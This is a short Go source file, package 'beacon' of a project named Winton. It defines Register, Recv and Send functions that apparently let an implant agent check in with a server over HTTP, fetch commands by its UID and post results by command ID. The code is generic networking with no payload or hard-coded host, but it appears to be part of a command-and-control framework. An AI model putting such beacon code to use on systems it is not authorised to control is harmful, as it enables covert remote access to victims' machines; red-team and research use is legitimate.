package beacon

import (
	"encoding/json"
	"fmt"

	"Winton/cmd/http"
)

var httpClient = http.NewHTTPClient()

func Register(agent Agent, endpoint string) ([]byte, error) {
	jsonAgent, err := json.Marshal(agent)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	res, err := httpClient.PostJSON(endpoint, jsonAgent)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}

func Recv(agent Agent, endpoint string) ([]byte, error) {
	res, err := httpClient.Get(endpoint + "/" + agent.UID)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}

func Send(agent Agent, endpoint string, result []byte, command_id string) ([]byte, error) {
	res, err := httpClient.PostJSON(endpoint+"/"+command_id, result)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return res, nil
}
